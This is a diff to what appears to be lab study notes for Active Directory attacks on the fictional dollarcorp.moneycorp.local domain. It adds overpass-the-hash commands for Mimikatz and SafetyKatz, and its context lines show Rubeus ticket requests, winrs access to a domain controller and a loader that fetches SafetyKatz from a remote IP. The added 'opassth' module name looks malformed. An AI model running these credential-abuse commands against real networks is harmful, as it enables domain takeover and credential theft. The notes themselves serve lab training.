@@ -1792,6 +1792,7 @@ opth: you are using NTLM or AES. we create a request or ticket from the DC.
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
+sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe
 OR
 Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows/System32\cmd.exe /show /ptt
 winrs -r:scorp-dc cmd   #use winrs to interact with DC with svcadmin user
@@ -1817,6 +1818,7 @@ as we can see Windows Defender detected the string Credentials. simple you can c
 used to load binary from filepath or URL   #https://github.com/Flangvik/NetLoader
 ```
 Loader.exe -path http://10.10.16.10/safetykatz.exe
+Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
 ```
 
 ### AssemblyLoad.exe
